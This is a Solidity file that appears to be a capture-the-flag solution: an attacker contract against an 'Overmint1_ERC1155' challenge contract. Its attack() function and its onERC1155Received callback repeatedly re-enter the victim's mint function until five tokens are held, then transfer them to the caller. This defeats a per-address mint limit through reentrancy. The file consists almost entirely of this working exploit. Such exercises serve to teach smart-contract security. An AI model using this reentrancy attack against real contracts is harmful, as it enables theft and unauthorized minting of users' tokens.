// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Overmint1-ERC1155.sol";

import "hardhat/console.sol";

contract Overmint1_ERC1155_Attacker is IERC1155Receiver {
    Overmint1_ERC1155 public victimAddress;

    constructor(Overmint1_ERC1155 victimAddress_) {
        victimAddress = victimAddress_;
    }

    function attack() external {
        victimAddress.mint(0, "");
        console.log(victimAddress.balanceOf(address(this), 0));

        victimAddress.safeTransferFrom(address(this), msg.sender, 0, 5, "");
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4) {
        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        if (victimAddress.balanceOf(address(this), 0) < 5) {
            victimAddress.mint(0, "");
        }

        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }

    function supportsInterface(bytes4 interfaceId) external view returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId;
    }
}
